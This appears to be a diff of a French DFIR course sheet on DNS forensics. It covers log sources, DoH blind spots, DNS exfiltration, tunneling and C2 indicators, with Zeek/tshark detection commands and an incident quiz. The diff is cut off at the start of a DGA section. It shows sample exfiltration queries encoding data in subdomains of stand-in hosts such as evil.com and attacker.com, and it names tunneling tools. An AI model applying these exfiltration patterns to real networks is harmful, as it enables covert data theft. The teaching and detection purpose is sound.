@@ -1,149 +1,859 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>DNS Forensique — CAS-IN Forensique</title>
-<meta name="description" content="Logs DNS · Exfiltration DNS · Beaconing · Passive DNS · Zeek">
+<meta name="description" content="DNS forensique · Exfiltration DNS · Beaconing C2 · DGA · Passive DNS · Tunneling · Zeek · Windows DNS logs · analyse PCAP">
+<meta name="theme-color" content="#0d1117">
 <link rel="stylesheet" href="../style/fiche_style.css">
 </head>
 <body>
-<a class="skip-link" href="#main-content">Aller au contenu</a>
-<div class="topbar">
-  <a href="index.html">← Fiches</a>
-  <span class="mod-label">Réseaux & Communications</span>
-  <a href="../quiz.html">💊 Quiz →</a>
-</div>
-<nav class="breadcrumb">
-  <a href="../index.html">🏠 Accueil</a><span class="sep">›</span>
-  <a href="index.html">Fiches</a><span class="sep">›</span>
-  <a href="index.html#cat-reseaux">Réseaux</a><span class="sep">›</span>
-  <span>DNS Forensique</span>
-  <span class="reading-time">⏱ ~4 min</span>
+<div id="scroll-progress"></div>
+<button class="back-top" id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Haut de page">↑</button>
+
+<nav class="tn-nav" aria-label="Navigation fiche">
+  <a href="index.html" class="tn-back">← Fiches</a>
+  <span class="tn-title">DNS FORENSIQUE</span>
+  <a href="../quiz.html" class="tn-quiz">💊 Quiz →</a>
 </nav>
-<main id="main-content">
-<div class="fiche-hero">
-  <div class="fiche-icon">🌐</div>
-  <div class="fiche-tags"><span class="tag ">DNS</span><span class="tag red">Exfiltration</span><span class="tag red">C2</span><span class="tag green">Passive DNS</span></div>
-  <h1>DNS Forensique</h1>
-  <p class="subtitle">Logs DNS · Exfiltration DNS · Beaconing · Passive DNS · Zeek</p>
+
+<div class="page-wrap">
+  <div class="breadcrumb">
+    <a href="../index.html">🏠 Accueil</a><span class="bc-sep">›</span>
+    <a href="index.html">Fiches</a><span class="bc-sep">›</span>
+    <a href="index.html#cat-reseau">Réseaux &amp; Investigation</a><span class="bc-sep">›</span>
+    <span class="bc-current">DNS Forensique</span>
+    <span class="read-time-badge" style="margin-left:auto">⏱ ~11 min</span>
+  </div>
+
+  <div class="header" style="margin-top:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)">
+    <div><span style="font-size:2.2rem">🌐</span>
+    <span class="tag tag-red" style="margin-left:.5rem">C2</span>
+    <span class="tag tag-gold" style="margin-left:.3rem">Exfiltration</span>
+    <span class="tag tag-cyan" style="margin-left:.3rem">Passive DNS</span>
+    <span class="tag tag-blue" style="margin-left:.3rem">DFIR</span></div>
+    <h1 style="font-family:var(--sans);font-size:2rem;font-weight:800;letter-spacing:-.5px;margin:.3rem 0 .15rem">DNS Forensique</h1>
+    <div class="meta">Logs DNS · Exfiltration · Beaconing · DGA · Tunneling · Passive DNS · Zeek · Windows DNS Server</div>
+  </div>
+
+  <div style="margin:1rem 0;padding:.9rem 1.25rem;background:rgba(0,229,204,.04);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;font-size:.82rem;line-height:1.65;color:var(--dim)">
+    <span style="color:var(--cyan);font-weight:700;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em">Principe fondamental</span><br>
+    <em style="color:var(--text)">"DNS is the most important protocol you'll ever overlook. Every attack leaves DNS breadcrumbs — if you know where to look."</em><br>
+    <span style="font-size:.72rem;margin-top:.3rem;display:block">— SANS SEC503, <em>Network Forensics</em></span>
+  </div>
+
+  <div style="margin:1rem 0;padding:.7rem 1rem;background:rgba(255,64,96,.05);border-left:3px solid var(--red);border-radius:0 8px 8px 0;font-size:.78rem;color:var(--dim)">
+    <span style="color:var(--red);font-weight:700">🎯 Pourquoi le DNS est critique en forensique :</span> Le DNS est souvent le <strong>seul protocole non filtré en sortie</strong> d'un réseau d'entreprise. Les pare-feux bloquent HTTP, HTTPS, FTP — mais laissent passer le DNS port 53. C'est pour cette raison que les attaquants l'utilisent massivement pour le C2, l'exfiltration de données, et la persistance. Et c'est souvent la source de preuves la plus négligée par les équipes défensives.
+  </div>
+
+  <div class="prereq-block" style="margin-top:1rem">
+    <div class="prereq-row"><span class="prereq-label">Prérequis :</span><a href="reseau.html" class="prereq-pill">📖 Réseaux</a><a href="wireshark_pcap.html" class="prereq-pill">📖 Wireshark &amp; PCAP</a></div>
+    <div class="prereq-row"><span class="prereq-label">Voir aussi :</span><a href="malware_forensique.html" class="related-pill">🔗 Malware Forensics</a><a href="ransomware_forensique.html" class="related-pill">🔗 Ransomware</a><a href="osint.html" class="related-pill">🔗 OSINT</a><a href="lateral_movement_forensique.html" class="related-pill">🔗 Lateral Movement</a></div>
+  </div>
 </div>
 
-<div class="anecdote">
-  <blockquote>"DNS is the most important protocol you'll ever overlook. Every attack leaves DNS breadcrumbs — if you know where to look."</blockquote>
-  <cite>— SANS SEC503 · Network Forensics</cite>
-  <div class="fact"><strong>💡 Pourquoi le DNS est sous-exploité :</strong> La plupart des enquêtes se concentrent sur HTTP/HTTPS. Pourtant, le DNS est souvent le <em>seul</em> protocole non filtré en sortie d'un réseau — raison pour laquelle les attaquants l'utilisent pour l'exfiltration de données et le command-and-control (C2).</div>
+<!-- TABS -->
+<div class="tabs" id="dns-tabs">
+  <button class="tab active" onclick="showTab('sources',this)">📋 Sources de logs</button>
+  <button class="tab" onclick="showTab('exfil',this)">📤 Exfiltration &amp; C2</button>
+  <button class="tab" onclick="showTab('dga',this)">🎲 DGA &amp; Beaconing</button>
+  <button class="tab" onclick="showTab('passive',this)">🔭 Passive DNS</button>
+  <button class="tab" onclick="showTab('outils',this)">🔧 Outils &amp; Analyse</button>
 </div>
 
-<div class="card">
-<h2>📋 Sources de logs DNS</h2>
-<div class="table-wrap"><table>
-<tr><th>Source</th><th>Localisation</th><th>Contenu</th><th>Rétention typique</th></tr>
-<tr><td><strong>Résolveur DNS local</strong></td><td>Serveur interne / pfSense / Pi-hole</td><td>Toutes les requêtes du réseau interne</td><td class="cell-green">Configurable</td></tr>
-<tr><td><strong>Windows DNS Server</strong></td><td><code>Event Viewer → DNS Server</code></td><td>Requêtes reçues, réponses, erreurs</td><td class="cell-yellow">Selon politique</td></tr>
-<tr><td><strong>Routeur / Firewall</strong></td><td>Syslog / interface web</td><td>Requêtes et réponses visibles en clair</td><td class="cell-yellow">7–90 jours</td></tr>
-<tr><td><strong>Zeek (Bro)</strong></td><td><code>dns.log</code></td><td>Requêtes/réponses DNS structurées en JSON</td><td class="cell-green">Selon stockage</td></tr>
-<tr><td><strong>Cloud (Azure DNS, AWS Route53)</strong></td><td>Portail cloud</td><td>Logs DNS des zones hébergées</td><td class="cell-blue">Variable</td></tr>
-<tr><td><strong>Passive DNS (externe)</strong></td><td>VirusTotal, DNSDB, RiskIQ</td><td>Résolutions historiques mondiales</td><td class="cell-blue">Années</td></tr>
-</table></div>
+<!-- ══════════════════════════════════════════════
+     TAB 1 — SOURCES DE LOGS
+══════════════════════════════════════════════ -->
+<div class="tab-page active" id="tab-sources">
+
+<div class="concept-card">
+  <div class="concept-title">🌐 Le DNS — Architecture et flux forensiques</div>
+  Chaque requête DNS suit un chemin : <strong>client → résolveur local → forwarder → résolveurs racine → NS autoritaire</strong>. Chaque étape peut laisser des logs. En forensique, la priorité est le <strong>résolveur local</strong> (voit toutes les requêtes internes) et les <strong>logs Windows DNS Server</strong> (si l'entreprise héberge son propre DNS). Les requêtes directes vers des résolveurs externes (8.8.8.8, 1.1.1.1) sans passer par le résolveur interne sont elles-mêmes un indicateur suspect — technique pour éviter la journalisation.
 </div>
 
-<div class="card">
-<h2>🔴 DNS Exfiltration</h2>
-<div class="callout danger"><span class="callout-icon">🚨</span>
-<div class="callout-body"><strong>Technique :</strong> Les données sont encodées en Base64 dans des sous-domaines DNS. L'attaquant contrôle le serveur DNS autoritaire pour les recevoir. Passe souvent inaperçu car le DNS est rarement bloqué en sortie.</div></div>
-<div class="grid-2">
-<div class="grid-card"><h4>Indicateurs d'exfiltration DNS</h4><ul>
-<li>Sous-domaines anormalement longs (> 30 chars)</li>
-<li>Caractères Base64 dans les sous-domaines (A-Z, 0-9, +/=)</li>
-<li>Volume élevé de requêtes vers un seul domaine</li>
-<li>Type de requête inhabituel : TXT, NULL, CNAME</li>
-<li>Intervalles réguliers (beaconing)</li>
-</ul></div>
-<div class="grid-card"><h4>Exemple concret</h4><ul>
-<li><code>aGVsbG8=.attacker.com</code> → "hello" en Base64</li>
-<li><code>dGhpc2lzc2VjcmV0.attacker.com</code> → données exfiltrées</li>
-<li>Outils offensifs : iodine, dns2tcp, DNScat</li>
-<li>Détection : analyser la longueur moyenne des sous-domaines</li>
-</ul></div>
+<div class="sec-title">Sources de logs DNS — Cartographie</div>
+<div style="display:grid!important;grid-template-columns:repeat(3,1fr);gap:.5rem;margin:.75rem 0">
+
+  <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(0,229,204,.4);text-align:center;cursor:pointer;background:rgba(0,229,204,.08);color:var(--cyan)" onclick="showSource('windows')">
+    <span style="font-size:1.3rem;display:block;margin-bottom:.2rem">🪟</span>
+    <div style="font-size:.72rem;font-weight:700">Windows DNS Server</div>
+    <div style="font-size:.57rem;opacity:.75;margin-top:.1rem">Event Log · Debug log<br>ETW tracing</div>
+  </div>
+
+  <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(240,192,64,.4);text-align:center;cursor:pointer;background:rgba(240,192,64,.08);color:var(--gold)" onclick="showSource('zeek')">
+    <span style="font-size:1.3rem;display:block;margin-bottom:.2rem">🦡</span>
+    <div style="font-size:.72rem;font-weight:700">Zeek (Bro)</div>
+    <div style="font-size:.57rem;opacity:.75;margin-top:.1rem">dns.log structuré<br>JSON · TSV</div>
+  </div>
+
+  <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(188,140,255,.4);text-align:center;cursor:pointer;background:rgba(188,140,255,.08);color:var(--purple)" onclick="showSource('firewall')">
+    <span style="font-size:1.3rem;display:block;margin-bottom:.2rem">🔥</span>
+    <div style="font-size:.72rem;font-weight:700">Firewall / Proxy</div>
+    <div style="font-size:.57rem;opacity:.75;margin-top:.1rem">pfSense · Fortigate<br>Pi-hole · Squid</div>
+  </div>
+
+  <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(255,64,96,.4);text-align:center;cursor:pointer;background:rgba(255,64,96,.08);color:var(--red)" onclick="showSource('pcap')">
+    <span style="font-size:1.3rem;display:block;margin-bottom:.2rem">📦</span>
+    <div style="font-size:.72rem;font-weight:700">PCAP / Capture réseau</div>
+    <div style="font-size:.57rem;opacity:.75;margin-top:.1rem">Wireshark · tshark<br>tcpdump · Arkime</div>
+  </div>
+
+  <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(48,232,138,.4);text-align:center;cursor:pointer;background:rgba(48,232,138,.08);color:var(--green)" onclick="showSource('cloud')">
+    <span style="font-size:1.3rem;display:block;margin-bottom:.2rem">☁️</span>
+    <div style="font-size:.72rem;font-weight:700">Cloud DNS</div>
+    <div style="font-size:.57rem;opacity:.75;margin-top:.1rem">Azure DNS · Route53<br>Google Cloud DNS</div>
+  </div>
+
+  <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(88,166,255,.4);text-align:center;cursor:pointer;background:rgba(88,166,255,.08);color:var(--blue)" onclick="showSource('passive')">
+    <span style="font-size:1.3rem;display:block;margin-bottom:.2rem">🔭</span>
+    <div style="font-size:.72rem;font-weight:700">Passive DNS externe</div>
+    <div style="font-size:.57rem;opacity:.75;margin-top:.1rem">VirusTotal · DNSDB<br>SecurityTrails</div>
+  </div>
+
 </div>
-<pre>
-# Zeek : détecter les sous-domaines longs
-cat dns.log | zeek-cut query | awk '{n=split($0,a,"."); if(length(a[1])>30) print}' | sort | uniq -c | sort -rn
-</pre>
+<div class="arch-detail" id="source-detail" style="margin-bottom:1rem">
+  <div style="color:var(--dim);font-size:.78rem">ℹ️ Cliquez sur une source pour afficher ses artefacts et ses limites</div>
 </div>
 
-<div class="card">
-<h2>🔄 DNS Beaconing — Indicateur C2</h2>
-<p style="font-size:13px;color:var(--text-muted);margin-bottom:10px">Le beaconing C2 via DNS est caractérisé par des requêtes périodiques régulières vers un même domaine :</p>
-<div class="table-wrap"><table>
-<tr><th>Indicateur</th><th>Normal</th><th>Beaconing C2</th></tr>
-<tr><td>Intervalle</td><td>Aléatoire, selon usage</td><td class="cell-red">Régulier (30s, 60s, 5min…)</td></tr>
-<tr><td>Domaine</td><td>Divers, connus</td><td class="cell-red">DGA ou domaine unique inconnu</td></tr>
-<tr><td>Réponse</td><td>IP stable (CDN)</td><td class="cell-red">NXDOMAIN alternant / IP dynamique</td></tr>
-<tr><td>Volume</td><td>Quelques requêtes</td><td class="cell-red">Centaines/heure</td></tr>
-<tr><td>TTL</td><td>300–86400s</td><td class="cell-yellow">TTL très bas (< 30s)</td></tr>
-</table></div>
-<pre>
-# Détecter beaconing avec Zeek + tshark
-tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns" | sort | uniq -c | sort -rn | head -20
-</pre>
+<!-- Table sources -->
+<div class="sec-title">Comparatif des sources — Référence forensique</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Source</th><th>Contenu</th><th>Rétention typique</th><th>Limite principale</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">Windows DNS Server<br>Event Log (4xx)</td>
+      <td style="font-size:.74rem">Requêtes reçues, réponses, erreurs, transferts de zone. EID 150 (query) sur DNS Server Debug Log.</td>
+      <td style="font-size:.72rem;color:var(--gold)">Selon politique (souvent court)</td>
+      <td style="font-size:.72rem">Debug log désactivé par défaut. Ne voit que les requêtes passant par ce serveur.</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">Zeek dns.log</td>
+      <td style="font-size:.74rem">id.orig_h, id.resp_h, proto, query, qtype, answers, TTL, rcode. Structuré, analysable avec awk/jq/splunk.</td>
+      <td style="font-size:.72rem;color:var(--green)">Selon stockage (mois/années)</td>
+      <td style="font-size:.72rem">Nécessite une capture réseau (TAP/SPAN). Ne voit pas le trafic chiffré DoH/DoT.</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--purple)">Firewall / Pi-hole</td>
+      <td style="font-size:.74rem">Requêtes bloquées/autorisées par client IP. Pi-hole = liste noire avec stats par domaine.</td>
+      <td style="font-size:.72rem;color:var(--gold)">7–90 jours</td>
+      <td style="font-size:.72rem">Volume important, rotation rapide. Bypass facile (requêtes directes vers 8.8.8.8).</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--red)">PCAP (port 53)</td>
+      <td style="font-size:.74rem">Capture complète requêtes/réponses UDP/TCP port 53. Payload complet. Idéal pour analyse approfondie.</td>
+      <td style="font-size:.72rem;color:var(--red)">Court (espace disque)</td>
+      <td style="font-size:.72rem">Stockage coûteux. DoH (port 443) invisible. Nécessite TAP/SPAN sur le réseau.</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--blue)">Passive DNS externe</td>
+      <td style="font-size:.74rem">Résolutions historiques mondiales. Qui résolvait quoi, quand, depuis quelles IPs. Années de rétention.</td>
+      <td style="font-size:.72rem;color:var(--green)">Années</td>
+      <td style="font-size:.72rem">Ne couvre pas le trafic DNS interne. Résolutions privées absentes. Coût (DNSDB, RiskIQ).</td>
+    </tr>
+  </tbody>
+</table>
 </div>
 
-<div class="card">
-<h2>🔍 Passive DNS — Investigation rétrospective</h2>
-<div class="callout tip"><span class="callout-icon">💡</span>
-<div class="callout-body"><strong>Passive DNS :</strong> Bases de données mondiales qui enregistrent les résolutions DNS au fil du temps. Permettent de savoir quelle IP un domaine résolvait il y a 2 ans, ou quels autres domaines ont pointé vers la même IP.</div></div>
-<div class="grid-2">
-<div class="grid-card"><h4>Services Passive DNS</h4><ul>
-<li><strong>VirusTotal</strong> — Relations et résolutions historiques</li>
-<li><strong>DNSDB (Farsight)</strong> — Base la plus complète (payante)</li>
-<li><strong>RiskIQ / Microsoft Defender</strong></li>
-<li><strong>SecurityTrails</strong></li>
-<li><strong>Shodan</strong> — DNS inversé par IP</li>
-</ul></div>
-<div class="grid-card"><h4>Cas d'usage forensique</h4><ul>
-<li>Retrouver l'IP hébergeant un C2 qui a changé de DNS</li>
-<li>Identifier d'autres domaines malveillants sur la même IP</li>
-<li>Reconstruire l'infrastructure d'un attaquant</li>
-<li>Confirmer la date de première utilisation d'un domaine</li>
-</ul></div>
-</div>
+<div class="alert">
+  ⚠️ <strong>DNS over HTTPS (DoH) et DNS over TLS (DoT)</strong> — angle mort majeur : depuis l'adoption de DoH par les navigateurs (Chrome, Firefox) et les OS (Windows 11), une partie croissante des requêtes DNS passe par le port 443 chiffré. Elle est <strong>invisible aux captures DNS classiques</strong> (port 53). Un attaquant utilisant DoH pour son C2 ne laissera aucune trace dans les logs DNS traditionnels — seule une analyse du trafic HTTPS vers des résolveurs DoH connus (1.1.1.1, 8.8.8.8, 9.9.9.9) permettra la détection.
 </div>
 
-<div class="card">
-<h2>🛠️ Outils DNS forensiques</h2>
-<ul>
-<li><strong>Zeek (Bro) :</strong> Analyse PCAP → dns.log structuré en TSV/JSON. Référence en IR réseau.</li>
-<li><strong>tshark :</strong> <code>tshark -r cap.pcap -T fields -e dns.qry.name -Y dns</code></li>
-<li><strong>DNStwist :</strong> Détection de typosquatting — variantes orthographiques d'un domaine</li>
-<li><strong>Malicious Domain Checker :</strong> APIs VirusTotal, URLhaus, PhishTank</li>
-<li><strong>MassDNS :</strong> Résolution en masse pour les investigations OSINT</li>
-<li><strong>Dig / nslookup :</strong> Requêtes manuelles avec options (type, serveur spécifique)</li>
-</ul>
-<pre>
-# Extraire tous les domaines distincts d'un PCAP
-tshark -r file.pcap -T fields -e dns.qry.name -Y "dns.flags.response == 0" | sort -u
-</pre>
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>🪟 Activer le DNS Debug Log Windows</h4>
+    <ul class="memo-list">
+      <li>DNS Manager → serveur → Propriétés → Debug Logging</li>
+      <li>Ou PowerShell : <code>Set-DnsServerDiagnostics -All $true</code></li>
+      <li>Log dans <code>%SystemRoot%\System32\dns\dns.log</code></li>
+      <li>Format : timestamp, client IP, query name, type, response</li>
+      <li>Attention : très verbeux — activer uniquement pour investigation ciblée</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>🚨 Indicateurs DNS suspects — triage rapide</h4>
+    <ul class="memo-list">
+      <li>Requêtes DNS directes vers 8.8.8.8 depuis des postes internes = bypass résolveur interne</li>
+      <li>Sous-domaines &gt; 30 caractères = potentielle exfiltration</li>
+      <li>Type TXT/NULL/CNAME en quantité = tunneling</li>
+      <li>TTL &lt; 30 secondes = infrastructure C2 dynamique</li>
+      <li>Requêtes NXDOMAIN en masse = DGA (Domain Generation Algorithm)</li>
+    </ul>
+  </div>
+</div>
+</div><!-- /tab-sources -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 2 — EXFILTRATION & C2
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-exfil">
+
+<div class="concept-card">
+  <div class="concept-title">📤 Exfiltration DNS &amp; Command-and-Control</div>
+  Le DNS est le canal d'exfiltration et de C2 préféré des attaquants avancés car il est <strong>rarement bloqué ou monitoré</strong>. Deux techniques principales : l'<strong>exfiltration DNS</strong> (données encodées dans des sous-domaines) et le <strong>tunneling DNS</strong> (protocole complet encapsulé dans DNS pour bypasser les restrictions réseau). Les deux nécessitent que l'attaquant contrôle un serveur DNS autoritaire pour recevoir les requêtes.
 </div>
 
-<div class="link-bar"><div class="link-group"><span class="link-group-label">Prérequis&nbsp;:</span><a href="reseau.html">📖 Réseaux & Infrastructure</a><a href="wireshark_pcap.html">📖 Wireshark & PCAP</a></div><div class="link-group"><span class="link-group-label">Pratiquer&nbsp;:</span><a href="../tp.html">🧪 🧪 📡 Réseau & PCAP</a></div><div class="link-group"><span class="link-group-label">Voir aussi&nbsp;:</span><a href="wireshark_pcap.html">🔗 Wireshark & PCAP</a><a href="malware_forensique.html">🔗 Malware Forensics</a><a href="osint.html">🔗 OSINT</a></div></div>
-<div class="exam-tip"><strong>⚖️ Examen CAS-IN&nbsp;:</strong> DNS = souvent le seul protocole non filtré en sortie · Exfiltration DNS = données encodées Base64 dans sous-domaines · Sous-domaines > 30 chars = indicateur · Beaconing = requêtes périodiques régulières vers domaine C2 · TTL très bas (< 30s) = indicateur C2 · Passive DNS = résolutions historiques (VirusTotal, DNSDB) · Zeek dns.log = source principale d'analyse</div>
-<footer>
-  <span>CAS-IN Investigation Numérique · Forensique Suisse</span>
-  <span>SANS SEC503 · Zeek Documentation · DNSDB Farsight</span>
-</footer>
-</main>
-<button id="scroll-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+<div class="sec-title">Techniques — Cliquez pour les détails et IOCs</div>
+<div style="display:grid!important;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:.55rem;margin:.75rem 0">
+
+  <div class="meta-card mc-0" onclick="showExfil('subdomain')">
+    <div class="meta-num">Technique 1</div>
+    <div class="meta-name">Exfiltration par sous-domaines</div>
+    <div class="meta-desc">Données Base64 encodées dans les labels DNS. Simple et discret.</div>
+  </div>
+
+  <div class="meta-card mc-1" onclick="showExfil('tunneling')">
+    <div class="meta-num">Technique 2</div>
+    <div class="meta-name">Tunneling DNS</div>
+    <div class="meta-desc">Protocole complet (SSH, TCP) encapsulé dans DNS. iodine, dns2tcp.</div>
+  </div>
+
+  <div class="meta-card mc-2" onclick="showExfil('c2')">
+    <div class="meta-num">Technique 3</div>
+    <div class="meta-name">C2 via DNS TXT/NULL</div>
+    <div class="meta-desc">Instructions C2 dans les réponses TXT. CobaltStrike, Sliver.</div>
+  </div>
+
+  <div class="meta-card mc-3" onclick="showExfil('fastflux')">
+    <div class="meta-num">Technique 4</div>
+    <div class="meta-name">Fast Flux</div>
+    <div class="meta-desc">IP changeante à chaque résolution pour éviter le blocage.</div>
+  </div>
+
+</div>
+<div class="meta-detail" id="exfil-detail"></div>
+
+<!-- Exemples concrets -->
+<div class="sec-title">Exfiltration DNS — Exemples forensiques réels</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+  <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-bottom:.75rem;letter-spacing:.05em">EXEMPLES DE REQUÊTES DNS MALVEILLANTES — DANS UN PCAP OU LOG ZEEK</div>
+
+  <div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.5rem">
+    <div style="background:rgba(255,64,96,.04);border:1px solid rgba(255,64,96,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--red);font-weight:700;margin-bottom:.35rem">📤 Exfiltration par sous-domaines (Base64)</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.9;display:block">
+        <span style="color:var(--dim)"># Requêtes observées dans le PCAP</span><br>
+        aGVsbG8=.evil.com<br>
+        dGhpc2lzc2VjcmV0.evil.com<br>
+        Y29uZmlkZW50aWFs.evil.com<br><br>
+        <span style="color:var(--dim"># Décodage Base64</span><br>
+        echo "aGVsbG8=" | base64 -d<br>
+        → <strong>hello</strong> (données exfiltrées)
+      </code>
+    </div>
+    <div style="background:rgba(240,192,64,.04);border:1px solid rgba(240,192,64,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--gold);font-weight:700;margin-bottom:.35rem">🔍 Détection Zeek — sous-domaines longs</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.9;display:block">
+        <span style="color:var(--dim)"># Détecter labels > 30 chars</span><br>
+        cat dns.log | zeek-cut query |<br>
+        &nbsp;&nbsp;awk '{n=split($0,a,"."); if(length(a[1])>30) print}' |<br>
+        &nbsp;&nbsp;sort | uniq -c | sort -rn<br><br>
+        <span style="color:var(--dim"># Requêtes TXT suspectes</span><br>
+        cat dns.log | zeek-cut query qtype_name |<br>
+        &nbsp;&nbsp;grep "TXT" | sort | uniq -c | sort -rn
+      </code>
+    </div>
+    <div style="background:rgba(0,229,204,.04);border:1px solid rgba(0,229,204,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--cyan);font-weight:700;margin-bottom:.35rem">📦 tshark — Extraction depuis PCAP</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.9;display:block">
+        <span style="color:var(--dim"># Tous les domaines DNS uniques</span><br>
+        tshark -r cap.pcap -T fields \<br>
+        &nbsp;&nbsp;-e dns.qry.name \<br>
+        &nbsp;&nbsp;-Y "dns.flags.response==0" | sort -u<br><br>
+        <span style="color:var(--dim"># Volume par domaine</span><br>
+        tshark -r cap.pcap -T fields \<br>
+        &nbsp;&nbsp;-e dns.qry.name -Y "dns" |<br>
+        &nbsp;&nbsp;sort | uniq -c | sort -rn | head -20
+      </code>
+    </div>
+    <div style="background:rgba(188,140,255,.04);border:1px solid rgba(188,140,255,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--purple);font-weight:700;margin-bottom:.35rem">🔴 Indicateurs de tunneling DNS</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.9;display:block">
+        <span style="color:var(--dim"># Volume requêtes par source IP</span><br>
+        cat dns.log | zeek-cut id.orig_h query |<br>
+        &nbsp;&nbsp;awk '{print $1}' | sort | uniq -c | sort -rn<br><br>
+        <span style="color:var(--dim"># Taille des réponses anormale</span><br>
+        cat dns.log | zeek-cut query answers |<br>
+        &nbsp;&nbsp;awk 'length($2)>200 {print}' | head
+      </code>
+    </div>
+  </div>
+</div>
+
+<!-- Table indicateurs -->
+<div class="sec-title">Indicateurs d'exfiltration DNS — Référence</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Indicateur</th><th>Trafic normal</th><th>Exfiltration / Tunneling</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Longueur sous-domaine</td>
+      <td style="font-size:.74rem">&lt; 15 caractères typiquement</td>
+      <td style="font-size:.74rem;color:var(--red)">&gt; 30 caractères · souvent Base64 (A-Z, 0-9, +/=)</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Types de requêtes</td>
+      <td style="font-size:.74rem">A (IPv4), AAAA (IPv6), MX, CNAME</td>
+      <td style="font-size:.74rem;color:var(--red)">TXT, NULL, CNAME, MX en quantité anormale</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Volume requêtes / domaine</td>
+      <td style="font-size:.74rem">Quelques dizaines/jour</td>
+      <td style="font-size:.74rem;color:var(--red)">Centaines à milliers/heure vers même domaine</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Taille des réponses DNS</td>
+      <td style="font-size:.74rem">&lt; 512 bytes généralement</td>
+      <td style="font-size:.74rem;color:var(--red)">Réponses TXT de 512+ bytes · fragmentation UDP</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Entropie des labels</td>
+      <td style="font-size:.74rem">Faible — mots lisibles (google, microsoft)</td>
+      <td style="font-size:.74rem;color:var(--red)">Élevée — chaînes aléatoires, Base64, hex</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">NXDOMAIN ratio</td>
+      <td style="font-size:.74rem">&lt; 5% des requêtes</td>
+      <td style="font-size:.74rem;color:var(--red)">&gt; 50% NXDOMAIN = DGA probable</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Dans un fichier Zeek dns.log, un analyste observe 847 requêtes en 2 heures depuis le poste 192.168.1.45 vers des sous-domaines comme <code>aGVsbG8xMjM=.updates-microsoft.net</code>, <code>dGVzdGRhdGE=.updates-microsoft.net</code>. Le domaine <code>updates-microsoft.net</code> n'est pas Microsoft. Quels sont les indicateurs et quelle action forensique immédiate ?<small>Exfiltration DNS · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">
+    <strong>Indicateurs d'exfiltration DNS confirmés :</strong><br>
+    · Sous-domaines en Base64 (caractères A-Z, 0-9, = à la fin) → <code>echo "aGVsbG8xMjM=" | base64 -d</code> = "hello123" (données encodées)<br>
+    · 847 requêtes en 2h depuis un seul poste = volume anormal<br>
+    · Domaine typosquatté imitant Microsoft = infrastructure d'attaquant<br><br>
+    <strong>Actions forensiques immédiates :</strong><br>
+    1. <strong>Isoler le poste 192.168.1.45</strong> du réseau sans l'éteindre<br>
+    2. Calculer le volume de données exfiltrées : <code>taille_label × nb_requêtes ÷ 1.33</code> (overhead Base64)<br>
+    3. Vérifier <strong>passive DNS</strong> sur updates-microsoft.net (VirusTotal) → âge du domaine, IP associées<br>
+    4. Chercher le processus à l'origine des requêtes DNS sur le poste (Sysmon EID 22 si activé)<br>
+    5. Étendre la recherche à tous les postes contactant ce domaine dans les logs DNS<br>
+    6. Acquérir la RAM du poste avant toute action supplémentaire
+  </div>
+</div>
+</div><!-- /tab-exfil -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 3 — DGA & BEACONING
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-dga">
+
+<div class="concept-card">
+  <div class="concept-title">🎲 DGA &amp; Beaconing — Deux techniques de résilience C2</div>
